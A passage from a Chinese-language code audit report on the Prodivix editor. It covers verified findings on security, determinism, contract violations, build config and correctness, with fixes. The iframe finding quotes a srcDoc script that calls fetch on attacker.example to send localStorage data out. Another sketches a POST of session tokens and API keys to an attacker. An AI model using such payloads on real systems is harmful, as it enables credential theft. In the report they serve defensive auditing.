**详情**: ConsumeInstallationSetupState 只校验 setup-state 令牌未被消费且未过期,随后就把调用方提供的任意 installation_id 的 'active' 访问权授予该 state 对应的用户。没有任何东西把 state 绑定到该用户实际安装的 installation:state 行(apps/backend/internal/platform/database/database.go:560)没有 installation 列,webhook 的 sender 从未被记录(models.go:102),回调路由 GET /integrations/github/installations/setup/callback 注册时也没有 RequireAuth(routes.go:22)。当 INSERT 未匹配到任何 installation 时,函数返回 ErrInstallationNotFound 且事务回滚,因此 consumed_at 不会被设置——一个 state 令牌可以在其完整的 10 分钟 TTL 内被重放,用于无限次猜测 installation ID。一旦授权成功,ListInstallationRepositoriesForUser(store.go:188)会暴露受害组织的私有仓库列表,而 HandleUpsertBinding(handlers.go:219-236)会通过 UserHasInstallationAccess 检查,把攻击者的项目绑定到该 installation 下的仓库。

**失败场景**: 攻击者(任意已认证的 Prodivix 用户)调用 POST /api/integrations/github/installations/setup 拿到 state 令牌 S。随后反复调用 GET /api/integrations/github/installations/setup/callback?state=S&installation_id=<guess>;每次未命中都不会让 S 失效。一旦猜中 github_installations 中存在且状态为 'active' 的第一个 ID(另一位客户的组织 installation),就会插入一行 (attacker_user_id, victim_installation_id, 'active')。此后 GET /api/integrations/github/repositories?installationId=<victim> 会返回受害者的私有仓库(owner/name/full_name/private),而 POST /api/projects/<attacker project>/integrations/github/binding 也能对受害者的仓库成功执行。

**修复建议**: 把授权绑定到只有真正安装者才能产生的事实上:在 github_installations 上记录 webhook 安装者身份(sender.id)并要求它与 state 用户所关联的 GitHub 账号匹配;或者在 setup-state 行上存储预期的 installation_id / 每次安装的一次性随机数,并拒绝不匹配的请求。同时应在失败尝试时消费或限流 state 令牌,使其无法充当暴力破解的预言机。

**验证备注**: 证据与 store.go:296-313 完全一致。已验证三项支撑事实:(a) platform/database/database.go 中的 migration 13 创建的 github_installation_setup_states 只有 token_hash/user_id/expires_at/consumed_at/created_at 列——没有 installation 列,因此没有任何东西把 state 绑定到某个 installation;(b) GitHubWebhookPayload(models.go:102-115)从不捕获 webhook sender,applyInstallationPayload(handlers.go:321)也不授予任何按用户的访问权,因此真实 installation 的唯一授权路径就是这个回调;(c) routes.go:22 注册 GET /integrations/github/installations/setup/callback 时没有 RequireAuth,而 HandleCompleteSetup(handlers.go:139-157)把 c.Query("installation_id") 直接透传,没有任何所有权证明。apps/backend 中根本没有 GitHub API 客户端(只读取了配置中的 AppID/PrivateKey),因此不存在任何服务端对"谁实际安装了应用"的验证。重放的观察也正确:rows==0 会在 consumed_at 的 UPDATE 之前返回 ErrInstallationNotFound,延迟执行的 tx.Rollback 丢弃一切,使 state 在整个 TTL 内保持可复用(何况 BeginSetup 本来就能无限量地铸造新的 state)。在下游,UserHasInstallationAccess(store.go:215-224)是 HandleUpsertBinding 和 HandleListRepositories 的唯一门禁,因此伪造的授权会被认可。严重级别由 critical 修正为 high:该模块目前仅涉及元数据——从不铸造 installation access token,也没有任何仓库内容/推送路径消费该绑定——因此影响是跨租户泄露另一组织的 installation 及私有仓库列表,外加一条无效的绑定记录,而不是仓库写入或机密泄露。

##### H-SEC-02 PdxIframe 在没有默认 sandbox 的情况下渲染作者可控的 srcDoc/src,使脚本在编辑器 origin 中执行

- **位置**: [`packages/ui/src/embed/PdxIframe.tsx:122`](packages/ui/src/embed/PdxIframe.tsx#L122)
- **类别**: security ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `pkg-plugin-official-ui`

**详情**: PdxIframe 把 `src`、`srcDoc` 和 `sandbox` 直接转发给 `<iframe>`,既不校验也没有默认 sandbox(除非作者显式提供,`sandbox` 为 `undefined`)。与其同类 PdxEmbed 会把 URL 经由 `@prodivix/shared/safety` 的 `resolveSafeEmbedUrl` 处理不同,PdxIframe 完全没有安全层。`PdxIframe` 已在 PIR 渲染器中注册(`packages/pir-react-renderer/src/host/registry.ts:292` 的 `prodivixLeafAdapter`,它不做任何 prop 过滤),而它的 manifest 条目(`packages/ui/src/manifest/componentManifest.ts:386`)没有声明 prop schema,因此 PIR 节点上的每一个 prop 都会原样抵达该元素。Blueprint 画布在主应用文档中用 `PIRRenderer` 渲染 PIR 节点(`apps/web/src/editor/features/blueprint/editor/canvas/BlueprintEditorCanvas.tsx:421`),因此 `srcDoc` 文档继承编辑器的 origin,并拥有完整的 `window.parent` 访问权。

**失败场景**: 一个包含 `{ type: 'PdxIframe', props: { srcDoc: "<script>fetch('https://attacker.example/x?d='+encodeURIComponent(localStorage.getItem('...')))</script>" } }` 的 PIR UI 文档——经由 Workspace/项目导入、共享模板、插件的 blueprint-template 贡献,或 AI 生成的内容抵达——在 Blueprint 编辑器中被打开。画布挂载该节点,srcdoc 文档与编辑器同源运行,可以读取编辑器的 localStorage/IndexedDB 并操纵 `window.parent` 的 DOM。除打开文档之外不需要任何用户操作。

**修复建议**: 把 `sandbox` 默认设为一组受限的 token(例如 `'allow-scripts allow-same-origin'` 同时使用是*不*安全的——只选 `allow-scripts`,或不要 `allow-same-origin`),并让 `src` 走 PdxEmbed 所用的同一条 `parseHttpUrl`/`resolveSafeEmbedUrl` 路径。至少应在未设置显式 opt-in prop 时拒绝输出 `srcDoc`,并始终输出 `sandbox` 属性,使该 frame 永远不会继承嵌入方的 origin。

**验证备注**: 证据完全吻合:PdxIframe.tsx:118 传入 `sandbox={sandbox}`(默认为 undefined,无兜底),:121-122 原样传入 `src`/`srcDoc`,:124 还有 `{...rest}`。已确认其同类 PdxEmbed.tsx:13-18,89-94 确实做了加固(BLOCKED_IFRAME_PROP_NAMES 阻止 src/srcdoc/children/dangerouslysetinnerhtml,并把 url 经由 resolveSafeEmbedUrl 处理)——因此这种不对称是真实的,而且 specs/implementation/reviews/gemini-2026-07-22.md 显示同样的 PdxEmbed srcDoc 漏洞此前被定级为 CRITICAL 并已修复,PdxIframe 却被搁置。可达性已端到端确认:registry.ts:292 把 PdxIframe 映射到 prodivixLeafAdapter,后者没有 mapProps(registry.ts:186-190);PIRElementProjection.tsx:66-75,121-123 把 resolvedProps 直接展开到组件上,没有任何白名单;componentManifest.ts:386 使用裸的 `entry()` 辅助函数,其 `props` 默认为 `{}`(manifest.ts:50),因此没有任何按 schema 的 prop 过滤。BlueprintEditorCanvas.tsx:417-421 在主应用文档中挂载 PIRRenderer(而非嵌套 frame)。搜索缓解措施后一无所获:apps/web 与 apps/backend 中没有任何 Content-Security-Policy,apps/web/vite.config.ts 只设置了 COEP/COOP 头(它们无法阻止同源 srcdoc 脚本)。我尝试了最强的反驳论点——编辑器本就同源执行作者代码,srcDoc 并未新增权限——但它站不住脚:对 apps/web/src 和 packages/*/src 执行 `git grep 'new Function|eval('` 只命中编译器测试文件,`resolveCodeValue` 在 apps/web 中没有任何实现,因此 srcdoc 确实会成为一个全新的同源执行原语。严重级别由 critical 修正为 high:利用仍然需要打开一个不可信/导入的 PIR 文档(导入、共享模板、插件贡献、AI 输出),而不是无需用户操作即可远程触发。

##### H-SEC-03 编辑器 origin 从 esm.sh 动态导入未固定版本的第三方 ESM,使 CDN/包所有者可在存放认证 bearer token 的 origin 中执行代码

- **位置**: [`packages/pir-react-renderer/src/host/iconRegistry.ts:487`](packages/pir-react-renderer/src/host/iconRegistry.ts#L487)
- **类别**: security ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `xcut-security`

**详情**: `ensureFontAwesomeReady`/`ensureHeroiconsOutlineReady` 调用 `loadEsmCandidates`,后者针对硬编码的 `https://esm.sh/...` URL 执行 `await import(url)`。FontAwesome 的 URL 完全没有版本说明符(`@fortawesome/react-fontawesome`、`@fortawesome/free-solid-svg-icons`),因此 esm.sh 会在每次加载时解析并转译当前的 `latest` 版本(`v=${cacheBust}`,其中 `cacheBust = Date.now().toString(36)`,使缓存失效)。动态 `import()` 无法携带子资源完整性校验,而 `apps/web/docker/nginx.conf` 根本不输出任何 `Content-Security-Policy`,因此没有任何机制约束所获取模块的行为。被导入的模块以完整的编辑器 origin 权限运行。同一个 origin 还在 `localStorage` 中持久化了 API bearer token(`apps/web/src/auth/useAuthStore.ts:47`,键为 `prodivix-auth-session`)以及用户的 LLM provider `apiKey`(`apps/web/src/ai/aiSettingsStore.ts:21`)。此外,`ensureHostReactImportMap` 还会向宿主文档注入一个 `importmap` <script>,以满足远程模块对裸 `react` 的导入,从而进一步把远程代码与宿主 React 实例耦合在一起。

**失败场景**: 用户打开任意一个节点带有 `props.iconRef = { provider: 'fontawesome', name: 'user' }` 的 PIR 文档。`resolveIconRef`(第 286 行)找不到缓存的图标,于是调用 `ensureIconProviderReady`(第 299 行)-> `ensureFontAwesomeReady`(第 559 行)-> `import('https://esm.sh/@fortawesome/react-fontawesome?target=es2022&external=react&v=<now>')`。如果上游 npm 包发布了恶意补丁版本,或者 esm.sh 被攻陷/DNS 被劫持,返回的模块体就会在编辑器 origin 中运行并执行 `fetch(attacker, {method:'POST', body: localStorage.getItem('prodivix-auth-session') + localStorage.getItem('prodivix-ai-settings')})`,把用户的 Prodivix 会话 bearer token 和 LLM API key 外泄。没有任何 CSP `script-src`/`connect-src` 可以阻止这次加载,也无法阻止外泄。

**修复建议**: 不要在运行时从第三方 CDN 获取图标运行时。把图标包作为固定版本的 workspace 依赖打包进来(就像 `lucide-react` 已经做的那样);如果必须保留远程加载,则(a)固定精确版本(`@fortawesome/react-fontawesome@x.y.z`),(b)从项目自己控制的第一方 origin 提供这些模块,(c)在 `apps/web/docker/nginx.conf` 中添加 `Content-Security-Policy`,并给出显式的 `script-src`/`connect-src` 允许列表。另外,单独把会话 token 从 `localStorage` 迁移到脚本不可读的存储中。

**验证备注**: 证据完全吻合。iconRegistry.ts:485-493 构造了 `https://esm.sh/@fortawesome/react-fontawesome?...` 和 `.../free-solid-svg-icons?...`,完全没有版本说明符;loadEsmCandidates(第 373 行)执行 `await import(/* @vite-ignore */ url)`。该 provider 在模块加载时被无条件注册(第 656 行,`ensureReady: ensureFontAwesomeReady`),并且可从生产渲染路径(registry.ts:210 -> resolveIconRef -> ensureIconProviderReady)以及 Inspector 的 IconPickerModal 到达,因此并非仅测试可达。任何地方都不存在 CSP:apps/web/docker/nginx.conf 不输出 Content-Security-Policy,apps/web/index.html 也没有 CSP meta(只有一个 importmap)。useAuthStore.ts 把 `token` 以 `prodivix-auth-session` 为键持久化到 localStorage,aiSettingsStore.ts 把 provider 设置持久化在 `prodivix-ai-settings` 下,二者都可被该 origin 中运行的任何代码读取。动态 import() 无法携带 SRI,因此审查者所说缺失的缓解措施确实缺失。我无法反驳其中任何一点。我把 critical 降为 high,仅仅是因为利用该问题需要先攻陷第三方(esm.sh、其 DNS,或 @fortawesome 的 npm 发布者);攻击者仅凭针对 Prodivix 自身的手段无法触发它。注意 Heroicons 的 URL 是固定版本的(@2.2.0),因此版本未固定这一加重因素只适用于 FontAwesome,但未加沙箱的远程代码执行面对二者都真实存在。

#### 4.2.4 确定性(determinism)

##### H-DET-01 本地项目 outbox 用 JSON.stringify 比较经 codec 规范化的 snapshot 与内存中的 snapshot,永久卡死本地项目

- **位置**: [`apps/web/src/editor/workspaceSync/localProjectWorkspaceOutbox.ts:31`](apps/web/src/editor/workspaceSync/localProjectWorkspaceOutbox.ts#L31)
- **类别**: determinism ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-store-sync`

**详情**: `sameAuthoringSnapshot` 通过比较 `JSON.stringify` 的输出来判断持久化的本地项目记录是否与持久化 operation 链上的某个点匹配。其中一侧(来自 `getLocalProject` 的 `project.workspace`)经过了 `encodeWorkspaceSnapshot`/`decodeWorkspaceSnapshot`,它会按 `left.path.localeCompare(right.path)` 对 `documents` 排序后序列化(packages/workspace/src/workspaceCodec.ts:602-607),再通过遍历这个已排序数组重建 `docsById`(workspaceCodec.ts:527-536)。另一侧(`entries[0].baseSnapshot` 以及每次 `applyOperation` 的结果)是原始的内存 snapshot,其中新增文档会作为最后一个 `docsById` 键追加。JSON.stringify 对键顺序敏感,因此只要新增一个路径排序不在最后的文档,就没有任何索引能匹配,`materializeLocalProjectWorkspaceOperationChain` 随即抛出异常。属性测试(localProjectWorkspaceOutbox.property.test.ts)只在内存中修改已有文档,从不经过 codec 往返,因此这一点没有测试覆盖。

**失败场景**: 在一个仅浏览器的项目中,已有 `/pages/home.pir.json`,用户创建了 `/pages/about.pir.json`。Operation 1 提交正常,`saveLocalWorkspaceSnapshot` 持久化 `encode(S1)`,其 `docsById` 顺序变为 [about, home];而编辑器 store 保留的内存 S1 顺序是 [home, about]。用户做第二次编辑:条目 E2 以 `baseSnapshot = S1(内存)` 入队。`commitLocalProjectWorkspaceOutbox` 读取解码后的 S1' 并进行比较——每次 `sameAuthoringSnapshot` 调用都返回 false,`persistedPrefix` 停留在 -1,函数抛出 'The local canonical Workspace diverged from its durable operation chain.'。`dispatchWorkspaceAuthoringOperation` 用 `console.warn` 吞掉了它(workspaceAuthoringOperationDispatcher.ts:63-68),于是此后再也不会持久化任何内容,outbox 无界增长。下次页面加载时 `resumeLocalProjectWorkspaceOutbox` 抛出同样的错误,Editor.tsx 的 `.catch` 调用 `setLoadError(...)`,项目彻底无法再打开——第一次之后的每一次编辑都丢失了。

**修复建议**: 通过规范形式而不是原始 JSON 键顺序来比较 snapshot——例如先把两侧都经过 `encodeWorkspaceSnapshot` 再做字符串化,或者改为基于稳定身份(`workspaceRev`/`opSeq` 加上每个文档的 `id`/`contentRev`/`metaRev`)比较,而不是序列化整个对象。同时不要再在 `dispatchWorkspaceAuthoringOperation` 中仅用 `console.warn` 吞掉这个分歧错误。

**验证备注**: 引用的证据与 localProjectWorkspaceOutbox.ts:21-31 一致。我在 packages/workspace 中运行一次性 vitest 验证了两侧确实会分歧:在 decode(encode(base)) 之后,应用一条命令再重新 encode/decode,会以两种彼此独立的方式产生不同的 JSON.stringify 输出。(1) docsById 插入顺序:内存中为 [doc_root, code_main],往返后为 [code_main, doc_root],因为 encodeWorkspaceSnapshot 按 path 对文档排序(workspaceCodec.ts:602-607),而 decodeWorkspaceSnapshot 遍历这个已排序数组重建 docsById(527-536)。(2) 文档字段顺序:create 命令构建的是 {id,type,name,path,...}(workspaceCommand.ts:879-887),而 parseWorkspaceDocument 返回的是 {id,type,path,contentRev,metaRev,content,name,...}(workspaceCodec.ts:312-322)。实际范围比所述更广:一次普通的 PIR 元数据新增同样会分歧(内存中 content 为 {ui,metadata},规范形式为 {metadata,ui}),因此任何新增了不在规范位置上的键的补丁都会触发它。流程是真实的:getLocalProject -> decodePersistedProject -> decodeWorkspaceSnapshot(localProjectStore.ts:534, 743-748),而 entries[0].baseSnapshot 是编辑器 store 的内存 snapshot,并且在 commitLocalProjectWorkspaceOutbox 之后没有任何东西用持久化记录重新填充 store(workspaceAuthoringOperationDispatcher.ts:60-69 丢弃了结果)。抛出的异常在那里被 console.warn 吞掉,而重新加载时 Editor.tsx:234-268 会把同一个异常转成 setLoadError。属性测试只在内存中修改已有元数据、从不经过 codec 往返,证实它未被覆盖。high 级别是站得住脚的(仅本地的项目变得无法打开,第一次结构性变更之后的编辑全部丢失)。

#### 4.2.5 契约违反(contract-violation)

##### H-CV-01 HTTP artifact 上传丢弃描述符的 metadata/sourceTrace/label,导致浏览器 provider 拒绝每一个远端 artifact

- **位置**: [`apps/remote-runner-worker/src/httpControlPlaneClient.ts:251`](apps/remote-runner-worker/src/httpControlPlaneClient.ts#L251)
- **类别**: contract-violation ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `app-runner-worker`

**详情**: `workerAgent` 构建了完整的 `RemoteExecutionArtifactDescriptor`(workerAgent.ts:630-645),其中包含 `label`、`sourceTrace` 和它刚刚校验过的 `metadata`(`artifact.metadata?.reportId`、`snapshotDigest`、`status`,预览的 `readiness`/`health`,以及 diff 的 `changeCount`/`complete`)。而 HTTP 客户端只传输 `artifactId`(URL 路径)、`content-type`、worker/lease/event id、`kind`、`size`、`digest` 和 `expiresAt`。`label`、`sourceTrace` 与 `metadata` 被静默丢弃。control plane 的处理器(`apps/remote-runner-control-plane/src/httpHandler.ts:899-907`)纯粹依据这些请求头重建描述符,因此没有任何东西能恢复它们;`projectRemoteExecutionArtifact` 随后发出一个既无 metadata 又无 sourceTrace 的 `artifact` 事件。`packages/runtime-remote/src/remoteExecutionProvider.ts:462-560` 恰恰要求这些字段,并在它们缺失时抛出 `RemoteExecutionRecoveryRequiredError`。

**失败场景**: worker 完成一次 `preview` 执行,上传 `preview-bundle:<digest>`,带有 metadata `{snapshotDigest, readiness:'ready', health:'healthy', entryFilePath:'index.html', ...}` 和非空的 sourceTrace。经过真实的 HTTP 传输后,control plane 存储的描述符中 `metadata === undefined`、`sourceTrace === undefined`。浏览器读取该 artifact 事件,命中 `event.artifact.metadata?.snapshotDigest !== record.snapshotDigest` -> 抛出 `RemoteExecutionRecoveryRequiredError('Remote Preview artifact does not match the ready static bundle contract.')`。每一个 Build、Test、文件系统 diff 以及生产 Server Function artifact 都会遭遇同样的问题,因此在 HTTP control plane 上没有任何一次远程执行能够成功完成。`httpControlPlaneClient.test.ts` 和 `httpHandler.integration.test.ts` 都没有断言 metadata 的往返,因此没有任何测试能发现它。

**修复建议**: 在上传中发送完整描述符(label、sourceTrace、metadata)——例如一个 JSON 描述符分片,或一个有界的 `x-prodivix-artifact-descriptor` base64 请求头——并让 `httpHandler.ts` 解码并校验它,把结果作为 `putArtifact` 的描述符,而不是用标量请求头重建一个不完整的描述符。

**验证备注**: 引用的证据与 httpControlPlaneClient.ts:243-274 逐字吻合:只传输 artifactId(路径)、content-type、worker/lease/event id、kind、size、digest、expiresAt。httpHandler.ts:894-909 仅依据这些值重建描述符,别无其他(在 httpHandler.ts 中 git grep 'metadata' 零命中)。projectRemoteExecutionArtifact(remoteExecutionArtifact.ts:5-17)、remoteExecutionControlPlaneMemory.ts:496-531 中的 putArtifact、以及 postgresExecutionRepository.ts:700-725 都不会重建 label/sourceTrace/metadata,因此存储下来的 artifact 事件丢失了它们。workerAgent.ts:630-645 确实构建了这些字段。remoteExecutionProvider.ts:461-598 硬性要求:preview 需要 metadata.snapshotDigest/readiness/health/entryFilePath 加非空 sourceTrace,build 需要 metadata.snapshotDigest 加 sourceTrace,test 需要 reportId/snapshotDigest/status 加 sourceTrace,production 需要 requestId/artifactId/exportName/status 加精确的根 sourceTrace,文件系统 diff 需要 format/snapshotDigest/changeCount/complete——不满足即抛出 RemoteExecutionRecoveryRequiredError。生产可达性已验证:apps/remote-runner-worker/src/main.ts:94 使用这个 HTTP 客户端,apps/remote-runner-control-plane/src/main.ts:258 挂载这个处理器,apps/web/src/editor/features/execution/remoteProjectExecutionEnvironment.ts 在该 HTTP 客户端之上构造 createRemotePreviewExecutionProvider/createRemoteTestExecutionProvider。没有任何测试覆盖 metadata 往返(httpControlPlaneClient.test.ts 根本没有 artifact 用例;httpHandler.integration.test.ts:643-671 上传的是不带 metadata 的 'artifact-build')。严重级别由 critical 修正为 high:该故障对远程执行功能而言是确定性且彻底的,但它是失败关闭的并伴随醒目的恢复错误——没有机密泄露,没有持久化损坏,也没有任何东西抵达 Canonical Workspace。

#### 4.2.6 构建配置(build-config)

##### H-BC-01 apps/web 以 `strict: false` 做类型检查,因此 "Type check web" CI 门禁无法拒绝 null/undefined 或隐式 any 错误

- **位置**: [`apps/web/tsconfig.json:5`](apps/web/tsconfig.json#L5)
- **类别**: build-config ｜ **严重度**: High ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `infra-gates`

**详情**: `apps/web/tsconfig.json` 覆盖了 `tsconfig.base.json` 中仓库级的 `"strict": true`,为整个编辑器面(688 个受版本控制的源文件)关闭了严格模式。`pnpm --filter @prodivix/web typecheck` 运行 `tsc -b`,构建的恰好就是这份配置,于是 `strictNullChecks`、`noImplicitAny`、`strictFunctionTypes` 和 `strictPropertyInitialization` 全部被禁用。这正是 `.github/workflows/tests.yml:1691` 中 `Type check web` 步骤以及约 10 个 `verify:g2:*` 门禁内嵌的 `pnpm --filter @prodivix/web typecheck` 步骤所使用的配置。`apps/web/tsconfig.app.json` 看似恢复了严格性(第 18 行的 `"strict": true`),但它是孤立的:没有任何东西引用它(根 `tsconfig.json` 引用的是 `./apps/web`,而不是 `./apps/web/tsconfig.app.json`),而且它第 25 行的 `include` 写作 `["apps/web/src", ...]`,是相对仓库根编写的,而文件本身位于 `apps/web`,因此会解析到并不存在的 `apps/web/apps/web/src`。`apps/web/tsconfig.node.json` 因同样原因是死配置(从未被引用),所以 `apps/web/vite.config.ts` 也从未被类型检查。

**失败场景**: 把 `selectWorkspaceAnimationDocument` 改成可能返回 `undefined`,并删除 `apps/web/src/editor/features/execution/animationExecutionClient.ts:70` 处的守卫;此时 `read.decodedContent.timelines` 在 `pnpm --filter @prodivix/web typecheck` 下依然干净通过,CI 的 `Type check web` 步骤也通过,而应用在启动动画执行时会抛出 `TypeError: Cannot read properties of undefined (reading 'decodedContent')`。同样的改动放在任何 `packages/*` 模块中都会是编译错误,因为其他所有 workspace 都从 `tsconfig.base.json` 继承了 `strict: true`。

**修复建议**: 删除 `apps/web/tsconfig.json` 中的 `strict: false` / `noUnusedLocals: false` / `noUnusedParameters: false` 覆盖(并修复由此产生的错误,或先从 `strictNullChecks` 开始逐步收紧),并且要么删除孤立的 `tsconfig.app.json` / `tsconfig.node.json`,要么用正确的包内相对 `include` 通配把它们接入项目引用图。

**验证备注**: 已实测验证。`apps/web/tsconfig.json:5` 字面就是 `"strict": false`,覆盖了 `tsconfig.base.json:13` 的 `"strict": true`。在 apps/web 中运行 `tsc --showConfig`:解析后的配置报告 `"strict": false, "noUnusedLocals": false, "noUnusedParameters": false`。`apps/web/package.json:16` -> `"typecheck": "tsc -b --pretty false"`,构建的正是这份配置;`.github/workflows/tests.yml` 中有一个运行 `pnpm --filter @prodivix/web typecheck` 的 `Type check web` 步骤(审查者给出的行号 1691/1683 有误——该文件只有 69 行,相关步骤位于第 41 行和第 50 行——但这些步骤确实逐字存在)。`git grep tsconfig.app.json|tsconfig.node.json` 在整个仓库中零命中,而根 `tsconfig.json` 引用的是 `./apps/web`,因此二者确实是孤立的;`tsconfig.app.json` 的 include `["apps/web/src", ...]` 确实是相对 apps/web 解析的,指向并不存在的路径。apps/web/tsconfig.json 的 include 是 `["src/**/*"]`,因此 vite.config.ts 从未被类型检查。没有任何补偿性控制:vitest 不做类型检查,apps/web/eslint.config.js 使用的是不带类型信息的 `tseslint.configs.recommended`,无法捕获可空性问题。apps/web/src 下受版本控制的 .ts/.tsx 实际为 659 个(审查者写的是 688——略有高估)。animationExecutionClient.ts 中的守卫(`if (!read || read.status !== 'valid')`)确实如所引用地存在,因此该失败场景是示意性的而非现存缺陷,但门禁被削弱是真实且系统性的。high 级别成立:覆盖整个编辑器面的主要类型门禁被关闭,且没有任何替代手段。

### 4.3 Medium(55 条)

#### 4.3.1 正确性(correctness)

##### M-C-01 已保存的内部路由 trigger 永远无法再次保存:读投影写入 `params.to = routeId`,而草稿校验器要求路径/URL

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/triggerAuthoring.ts:150`](apps/web/src/editor/features/blueprint/editor/inspector/fields/triggers/triggerAuthoring.ts#L150)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: `projectTrigger` 把规范的 `navigate-route` 绑定投影为 `params: { to: binding.routeId, routeId: binding.routeId }`(bindingProjection.ts:75-82)。`InspectorTriggerItem` 通过 `toValue = selectedRoute?.path ?? rawToValue` 在显示层掩盖了这一点,但 `getTriggerDraftIssue` 校验的是*原始*的 `entry.params.to`。像 `route-2` 这样的 routeId 既不是 `https://…` 也不是 `/…`,因此 `getNavigateLinkKind` 返回 `null`,校验器返回 `'destination-invalid'`。由于 `InspectorTriggerItem` 在 `Boolean(draftIssue)` 时禁用保存(第 179 行),而 `useTriggerDraftAuthoring.save` 又重新检查同一断言(useTriggerDraftAuthoring.ts:110-114),这次编辑被拦截了两次。提交路径本身其实是可用的:`toEditableTrigger` 正确地回退到 `params.routeId` 并重建 `{kind:'navigate-route', routeId}`(bindingProjection.ts:229-241),因此这纯粹是一个假阴性的门禁。根路由的情况更糟:`routeOptions` 来自 `flattenRouteManifest`,它会跳过 id 为 `root` 的节点(routeCore.ts:339),因此绑定到根路由的 trigger 同样会在目标字段中显示原始 routeId,并且永远无法从 Inspector 中修复。

**失败场景**: 作者在一个按钮上添加 onClick trigger,输入 `/about` 并保存。此时 PIR 中保存的是 `{kind:'navigate-route', routeId:'route-2'}`。之后作者重新打开该节点,只把 Trigger Event 下拉框从 `onClick` 改为 `onPointerEnter`。草稿的 `params.to` 仍然是 `route-2`;目标输入框显示的仍然是 `/about`;界面弹出一条红色警告:"Use https:// for external links or choose an existing internal route.",而保存(对勾)按钮被永久禁用。唯一的出路是重新输入目标地址,而这一点并不容易被发现。

**修复建议**: 让 `getTriggerDraftIssue` 像条目视图那样具备路由感知能力:当 `entry.params.routeId` 指向一个已存在的路由时,无论 `params.to` 为何,都把该条目视为已解析的内部导航。最干净的做法是在 `projectTrigger` 中把 `to` 投影为路由*路径*(它本来就单独携带了 `routeId`),让读模型与校验器保持一致,并让校验器先解析 `routeId`,只有面向外部目标时才回退到 `getNavigateLinkKind(to)`。

**验证备注**: 证据与实际文件完全吻合。bindingProjection.ts:75-82 把规范的 navigate-route 投影为 params:{to: binding.routeId, routeId: binding.routeId}。triggerAuthoring.ts:150-154 校验的是原始的 entry.params.to;packages/router/src/routeNavigation.ts:3-17 显示 getNavigateLinkKind 对任何不以 http(s)://、/、# 或 ? 开头的值返回 null,因此像 'route-2' 这样的 routeId 会得到 'destination-invalid'。useTriggerDraftAuthoring.update(第 61-93 行)直接从规范条目播种草稿,没有任何归一化;toTriggerEntry(controller:320-330)原样复制 params;InspectorTriggerItem 只在显示层掩盖该值(toValue = selectedRoute?.path ?? rawToValue,第 45 行),同时保存按钮按 Boolean(draftIssue) 被禁用(第 179 行),save() 还会再次检查(useTriggerDraftAuthoring.ts:110-114)。flattenRouteManifest 确实在 routeCore.ts:339 处跳过 id 'root'。因此,编辑一个已保存的内部路由 trigger 的 Trigger Event 会被拦截。严重度下调:标题中的 'can never be re-saved' 有所夸大 —— 用户可以通过编辑目标输入框恢复(TriggerNavigateFields 的 onChange 会从 routeOptions 重新解析 routeId)、切换 Action 下拉框(这会重置 params 并走另一条校验分支),或删除后重建该 trigger。没有数据被破坏或丢失;这是在一个可恢复的编辑流程上令人困惑的假阴性门禁。

##### M-C-02 只要 workspace snapshot 发生变化,正在编辑中的 Data Model / Mock JSON 就会被丢弃,且没有任何编辑守卫

- **位置**: [`apps/web/src/editor/features/blueprint/editor/inspector/fields/InspectorDataScopeFields.tsx:58`](apps/web/src/editor/features/blueprint/editor/inspector/fields/InspectorDataScopeFields.tsx#L58)
- **类别**: correctness ｜ **严重度**: Medium ｜ **验证状态**: 已对抗验证确认 ｜ **审查单元**: `web-blueprint`

**详情**: `mountedDataModel` / `mountedMockData` 基于 `selectedNodeData` 做记忆化,而后者是 `createBlueprintInspectorNodeView` 产出的 `selectedNode.data`。该视图会在 `read` 变化时重建,而 `read` 是基于 `workspace` 对象标识做记忆化的(useBlueprintEditorInspectorController.ts:365-368),因此*每一次* workspace store 更新都会产生一个全新的、深度相等但标识不同的对象。`projectDataScope` -> `projectBinding` -> `cloneJsonValue` 保证了即便数据未变也会产生新的标识。随后那两个 effect 会无条件覆盖 `schemaDraft` / `mockDraft`。两个 textarea 都只在 `onBlur` 时提交,因此用户输入过程中发生的任何 workspace 更新都会毁掉尚未提交的文本。本分区中的同类草稿正是为此设置了守卫(CollectionInspectorPanel.tsx:198-202 的 `literalEditingRef`,UnitInput.tsx:223-227 的 `amountEditingRef`);该组件没有对应机制。

**失败场景**: 作者选中一个节点,勾选 "Mounted",然后在 Mock 文本框里输入了 30 行 mock JSON 负载而没有失焦。在其输入过程中,durable outbox 确认了先前的挂载事务(或某个后台界面应用了任意操作),从而替换了 `state.workspace`。`read` -> `selectedNode` -> `mountedMockData` 全都获得新的标识,effect 被触发,`setMockDraft(asSchemaText(mountedMockData))` 把文本框内容替换成 `{}`。所有输入的 JSON 都丢失了,而且没有任何提示。

**修复建议**: 为每个 textarea 增加一个编辑标记 ref:在 `onFocus` 时置位、在 `onBlur` 时清除,并在其置位期间让重置 effect 提前返回,与 `CollectionInspectorPanel` 中的 `literalEditingRef` 保持一致。另外,把 effect 的依赖改为序列化后的文本(`asSchemaText(...)`)而非对象标识,这样相同的数据就不会触发重置。

**验证备注**: 已端到端验证。InspectorDataScopeFields.tsx:58-65 与引用完全一致,且两个 textarea 都只在 onBlur 时提交(第 220 行与第 250 行)。标识链成立:read 基于 workspace 对象做 useMemo(useBlueprintEditorInspectorController.ts:365-368),selectedNode 基于 read(375-385),而 projectDataScope -> projectBinding -> cloneJsonValue(bindingProjection.ts:14, 28-33)对值做 JSON 往返,因此即使数据逐字节相同也会产生新的对象标识。于是 mountedDataModel/mountedMockData 在每次 workspace snapshot 替换时都会获得新标识,那两个 effect 会在没有编辑守卫的情况下无条件覆盖 schemaDraft/mockDraft。该场景可从真实生产代码到达:WorkspaceOutboxEffects.tsx:57-77 在 ack/already-applied 时调用 adoptRebasedWorkspaceOperation,而 editorStore.workspaceSlice 的 dispatch/adopt 路径都会设置一个全新的 workspace 对象。所引用的同类守卫确实存在,印证了预期模式(CollectionInspectorPanel.tsx:185/199-202/405-409 的 literalEditingRef,UnitInput.tsx:221-227/304-307 的 amountEditingRef)。中等严重度是恰当的:它会毁掉尚未提交的用户输入,但只在异步 workspace 更新恰好在输入过程中落地时才会发生,已经持久化的内容不会被破坏。

